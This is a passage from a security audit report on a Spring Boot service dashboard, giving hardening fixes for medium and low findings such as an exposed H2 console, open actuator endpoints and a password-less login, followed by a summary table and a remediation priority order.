                    "Kubeconfig file not found: " + value);
            }
            String canonical;
            try {
                canonical = configFile.getCanonicalPath();
            } catch (Exception e) {
                throw new IllegalArgumentException("Invalid file path");
            }
            if (!canonical.contains(".kube") &&
                    !canonical.endsWith(".kubeconfig")) {
                throw new IllegalArgumentException(
                    "Path doesn't look like a kubeconfig file");
            }
        }

        service.saveConfig(type, value);
    }

    @GetMapping("/pods")
    public List<K8sPodDto> listPods(
            @RequestParam(required = false) String namespace) {
        if (namespace != null &&
                !namespace.matches("^[a-zA-Z0-9-]+$")) {
            throw new IllegalArgumentException(
                "Invalid namespace format");
        }
        return service.listPods(namespace);
    }
}
```

---

## MEDIUM Severity Issues

### ISSUE #10: H2 Console Exposed with Remote Access

**File:** application.properties:22-24
**CVSS Estimate:** 6.5 (Medium)

**Description:**
H2 console is enabled and accessible from any network via web-allow-others=true. H2 console
provides full SQL access and can be used for remote code execution.

**Recommended Fix (application.properties):**
```properties
# H2 Console - DISABLE in production
spring.h2.console.enabled=${H2_CONSOLE_ENABLED:false}
spring.h2.console.path=/h2-console
spring.h2.console.settings.web-allow-others=false
```

Create application-dev.properties for development only:
```properties
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=false
```

---

### ISSUE #11: Actuator Endpoints Exposed Without Auth

**File:** application.properties:39
**CVSS Estimate:** 6.5 (Medium)

**Description:**
The /actuator/env endpoint exposes all environment variables, which may contain secrets.
All actuator endpoints are unauthenticated.

**Recommended Fix (application.properties):**
```properties
# Actuator - only expose safe endpoints
management.endpoints.web.exposure.include=health,info
management.endpoint.health.show-details=when-authorized

# Disable sensitive endpoints explicitly
management.endpoint.env.enabled=false
management.endpoint.beans.enabled=false
management.endpoint.configprops.enabled=false
management.endpoint.heapdump.enabled=false
management.endpoint.threaddump.enabled=false
management.endpoint.shutdown.enabled=false
```

---

### ISSUE #12: WebSocket Wildcard CORS

**File:** k8s/K8sWebSocketConfig.java:21
**CVSS Estimate:** 6.1 (Medium)

**Description:**
setAllowedOrigins("*") on the K8s exec WebSocket allows any website to initiate WebSocket
connections, enabling cross-site WebSocket hijacking attacks.

**Recommended Fix:**
Already addressed in Issue #5 fix. Key change:
```java
// BEFORE:
.setAllowedOrigins("*");

// AFTER:
.setAllowedOrigins(allowedOrigins.split(","));

// With application.properties:
app.cors.allowed-origins=http://localhost:4200
```

---

### ISSUE #13: Debug Logging Enabled in Production Config

**File:** application.properties:28, 36
**CVSS Estimate:** 5.3 (Medium)

**Description:**
show-sql=true logs all SQL queries (may contain sensitive data). DEBUG level logging
exposes internals.

**Recommended Fix (application.properties - default/production):**
```properties
spring.jpa.show-sql=false
logging.level.org.springframework.web=WARN
logging.level.com.antigravity.servicedashboard=INFO
logging.level.org.hibernate.SQL=WARN
```

Create application-dev.properties for development:
```properties
spring.jpa.show-sql=true
logging.level.org.springframework.web=DEBUG
logging.level.com.antigravity.servicedashboard=DEBUG
```

---

### ISSUE #14: Exception Messages Leak Internal Details

**File:** exception/GlobalExceptionHandler.java:14-23
**CVSS Estimate:** 5.3 (Medium)

**Description:**
Raw ex.getMessage() from RuntimeException is returned directly to the client. Stack traces
and internal error details (table names, SQL errors, file paths) can leak.

**Recommended Fix:**
```java
package com.antigravity.servicedashboard.exception;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.MethodArgumentNotValidException;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.ExceptionHandler;

import java.util.Map;
import java.util.UUID;

@ControllerAdvice
public class GlobalExceptionHandler {

    private static final Logger logger = LoggerFactory.getLogger(
        GlobalExceptionHandler.class);

    @ExceptionHandler(IllegalArgumentException.class)
    public ResponseEntity<Object> handleBadRequest(
            IllegalArgumentException ex) {
        return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                .body(Map.of("error", sanitizeMessage(ex.getMessage())));
    }

    @ExceptionHandler(SecurityException.class)
    public ResponseEntity<Object> handleSecurityException(
            SecurityException ex) {
        String errorId = generateErrorId();
        logger.error("Security violation [{}]: {}",
            errorId, ex.getMessage(), ex);
        return ResponseEntity.status(HttpStatus.FORBIDDEN)
                .body(Map.of("error", "Access denied",
                             "errorId", errorId));
    }

    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ResponseEntity<Object> handleValidation(
            MethodArgumentNotValidException ex) {
        var errors = ex.getBindingResult().getFieldErrors().stream()
                .map(fe -> fe.getField() + ": " + fe.getDefaultMessage())
                .toList();
        return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                .body(Map.of("error", "Validation failed",
                             "details", errors));
    }

    @ExceptionHandler(RuntimeException.class)
    public ResponseEntity<Object> handleRuntimeException(
            RuntimeException ex) {
        String errorId = generateErrorId();
        logger.error("Unhandled exception [{}]: {}",
            errorId, ex.getMessage(), ex);
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                .body(Map.of(
                    "error", "An internal error occurred",
                    "errorId", errorId,
                    "message", "Contact support with this error ID"
                ));
    }

    @ExceptionHandler(Exception.class)
    public ResponseEntity<Object> handleGenericException(Exception ex) {
        String errorId = generateErrorId();
        logger.error("Unexpected exception [{}]: {}",
            errorId, ex.getMessage(), ex);
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                .body(Map.of("error", "An unexpected error occurred",
                             "errorId", errorId));
    }

    private String generateErrorId() {
        return UUID.randomUUID().toString().substring(0, 8).toUpperCase();
    }

    private String sanitizeMessage(String message) {
        if (message == null) return "Invalid request";
        return message.replaceAll(
            "(?i)(table|column|schema|sql|file|path)\\s*[:=]\\s*\\S+",
            "[redacted]");
    }
}
```

---

## LOW Severity Issues

### ISSUE #15: Auto DDL in Production

**File:** application.properties:30
**CVSS Estimate:** 3.7 (Low)

**Description:**
spring.jpa.hibernate.ddl-auto=update auto-updates the schema on startup. In production,
this risks unintended schema changes and data loss.

**Recommended Fix (application.properties):**
```properties
spring.jpa.hibernate.ddl-auto=validate
```

Create application-dev.properties:
```properties
spring.jpa.hibernate.ddl-auto=update
```

Add Flyway dependency to pom.xml:
```xml
<dependency>
    <groupId>org.flywaydb</groupId>
    <artifactId>flyway-core</artifactId>
</dependency>
```

Create migration files in src/main/resources/db/migration/:
```sql
-- V1__initial_schema.sql
CREATE TABLE IF NOT EXISTS users (
    username VARCHAR(255) PRIMARY KEY,
    role VARCHAR(255),
    password VARCHAR(255) NOT NULL,
    preferences CLOB
);

CREATE TABLE IF NOT EXISTS data_sources (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    type VARCHAR(255) NOT NULL,
    config CLOB NOT NULL
);

-- Add remaining tables as needed
```

---

### ISSUE #16: Login Endpoint Has No Password Verification

**File:** controller/UserController.java:22-28
**CVSS Estimate:** 3.7 (Low)

**Description:**
The /api/auth/login endpoint accepts a username and calls verifyOrCreate, creating the user
if they don't exist. There is no password check, no credential validation, no session/token.

**Recommended Fix:**

Add password field to User.java:
```java
@JsonProperty(access = JsonProperty.Access.WRITE_ONLY)
@Column(nullable = false)
private String password;

public String getPassword() { return password; }
public void setPassword(String password) { this.password = password; }
```

Update UserService.java:
```java
private final PasswordEncoder passwordEncoder;

public UserService(UserRepository repository,
                   PasswordEncoder passwordEncoder) {
    this.repository = repository;
    this.passwordEncoder = passwordEncoder;
}

public Optional<User> authenticate(String username, String rawPassword) {
    return repository.findById(username)
            .filter(user -> passwordEncoder.matches(
                rawPassword, user.getPassword()));
}

public Optional<User> create(User user) {
    if (repository.existsById(user.getUsername()))
        return Optional.empty();
    user.setPassword(passwordEncoder.encode(user.getPassword()));
    if (user.getRole() == null) user.setRole("USER");
    return Optional.of(repository.save(user));
}
```

Update UserController.java login endpoint:
```java
private final JwtUtil jwtUtil;

// Inject JwtUtil via constructor

@PostMapping("/auth/login")
public ResponseEntity<?> login(@RequestBody User loginRequest) {
    if (loginRequest.getUsername() == null ||
            loginRequest.getPassword() == null) {
        throw new IllegalArgumentException(
            "Username and password required");
    }

    Optional<User> user = service.authenticate(
        loginRequest.getUsername(), loginRequest.getPassword());

    if (user.isEmpty()) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
            .body(Map.of("error", "Invalid credentials"));
    }

    String token = jwtUtil.generateToken(
        user.get().getUsername(), user.get().getRole());

    return ResponseEntity.ok(Map.of(
        "token", token,
        "username", user.get().getUsername(),
        "role", user.get().getRole()
    ));
}
```

---

### ISSUE #17: Vault URI Uses HTTP (Not HTTPS)

**File:** application.properties:7
**CVSS Estimate:** 3.7 (Low)

**Description:**
Vault communication is over unencrypted HTTP (http://localhost:8200).

**Recommended Fix (application.properties):**
```properties
spring.cloud.vault.uri=${VAULT_URI:https://localhost:8200}

# Optional SSL config
spring.cloud.vault.ssl.trust-store=${VAULT_TRUSTSTORE:}
spring.cloud.vault.ssl.trust-store-password=${VAULT_TRUSTSTORE_PWD:}
```

---

### ISSUE #18: Missing Input Validation on Entities

**Files:** All entity classes (DataSource.java, User.java, SyncDefinition.java, etc.)
**CVSS Estimate:** 3.7 (Low)

**Description:**
No @Valid, @NotBlank, @Size, or @Pattern annotations on entity fields. Controllers accept
@RequestBody without @Valid, allowing empty, oversized, or malformed input.

**Recommended Fix:**

DataSource.java:
```java
import jakarta.validation.constraints.NotBlank;
import jakarta.validation.constraints.Pattern;
import jakarta.validation.constraints.Size;

@NotBlank(message = "Name is required")
@Size(min = 1, max = 255, message = "Name must be 1-255 characters")
@Column(nullable = false)
private String name;

@NotBlank(message = "Type is required")
@Pattern(regexp = "^(REST_API|LOCAL_COMMAND|LOCAL_FILE)$",
         message = "Type must be REST_API, LOCAL_COMMAND, or LOCAL_FILE")
@Column(nullable = false)
private String type;

@NotBlank(message = "Config is required")
@Lob
@Column(nullable = false)
private String config;
```

SyncDefinition.java:
```java
@NotBlank(message = "Target table name is required")
@Pattern(regexp = "^sync_[a-zA-Z0-9_]+$",
         message = "Table name must start with 'sync_'")
@Size(max = 128)
@Column(name = "target_table_name", nullable = false)
private String targetTableName;

@NotBlank(message = "Sync mode is required")
@Pattern(regexp = "^(AUTO|MANUAL)$",
         message = "Sync mode must be AUTO or MANUAL")
@Column(name = "sync_mode", nullable = false)
private String syncMode;

@Pattern(regexp = "^(RELOAD|APPEND)$",
         message = "Strategy must be RELOAD or APPEND")
@Column(name = "sync_strategy")
private String syncStrategy;
```

Add @Valid to all controller @RequestBody parameters. Example:
```java
@PostMapping
public DataSource create(@Valid @RequestBody DataSource entity) {
    return service.create(entity);
}

@PutMapping("/{id}")
public ResponseEntity<DataSource> update(
        @PathVariable Long id,
        @Valid @RequestBody DataSource entity) {
    return service.update(id, entity)
            .map(ResponseEntity::ok)
            .orElse(ResponseEntity.notFound().build());
}
```

Apply @Valid to all controllers: AutomationController, SyncDefinitionController,
UserController, WidgetDefinitionController, NotificationRuleController.

---

## Summary of All Changes

| #  | Severity | Fix Summary                                          | Files Modified/Created                          |
|----|----------|------------------------------------------------------|-------------------------------------------------|
| 1  | CRITICAL | Command allowlist + argument array execution         | ShellService.java                               |
| 2  | CRITICAL | JWT auth + Spring Security + role-based access       | pom.xml, SecurityConfig, JwtUtil, JwtAuthFilter |
| 3  | CRITICAL | @PreAuthorize ADMIN + secret masking + audit log     | VaultController.java                            |
| 4  | CRITICAL | Externalize to env vars                              | application.properties                          |
| 5  | CRITICAL | WS auth interceptor + origin restrict + cmd allowlist| K8sWebSocketConfig, K8sWebSocketAuthInterceptor |
| 6  | HIGH     | SQL filter keyword blocklist + grammar validation    | TableService.java                               |
| 7  | HIGH     | URL validation blocking private/internal IPs         | New: UrlValidator.java, SyncService.java        |
| 8  | HIGH     | Base dir restriction + canonical path check          | FileService.java                                |
| 9  | HIGH     | @PreAuthorize ADMIN + input validation               | K8sController.java                              |
| 10 | MEDIUM   | Disable H2 console by default                        | application.properties                          |
| 11 | MEDIUM   | Remove /env from actuator                            | application.properties                          |
| 12 | MEDIUM   | Replace wildcard with configurable origin            | K8sWebSocketConfig.java                         |
| 13 | MEDIUM   | Disable show-sql, set logging to WARN                | application.properties                          |
| 14 | MEDIUM   | Generic error msgs + error IDs + server-side logging | GlobalExceptionHandler.java                     |
| 15 | LOW      | ddl-auto=validate + Flyway migrations                | application.properties, pom.xml                 |
| 16 | LOW      | Password field + bcrypt hashing + JWT login          | User.java, UserService.java, UserController.java|
| 17 | LOW      | HTTPS for Vault URI via env var                      | application.properties                          |
| 18 | LOW      | @NotBlank, @Pattern, @Size + @Valid on controllers   | All entity classes, all controllers             |

---

## Recommended Remediation Priority

1. **Issue #2** (Add authentication) - This is the single most impactful fix as it
   immediately protects all endpoints.
2. **Issue #1** (Command injection) - With auth in place, this prevents privilege
   escalation to OS-level access.
3. **Issue #5** (K8s WebSocket) - Prevents unauthorized cluster access.
4. **Issue #4** (Hardcoded credentials) - Quick win to rotate and externalize secrets.
5. **Issue #3** (Vault exposure) - Protected once #2 is in place, but masking adds
   defense-in-depth.
6. **Issues #6-9** (High severity) - Address SQL injection, SSRF, file read, and K8s
   config next.
7. **Issues #10-14** (Medium severity) - Configuration hardening.
8. **Issues #15-18** (Low severity) - Quality and defense-in-depth improvements.

---

End of Security Audit Report
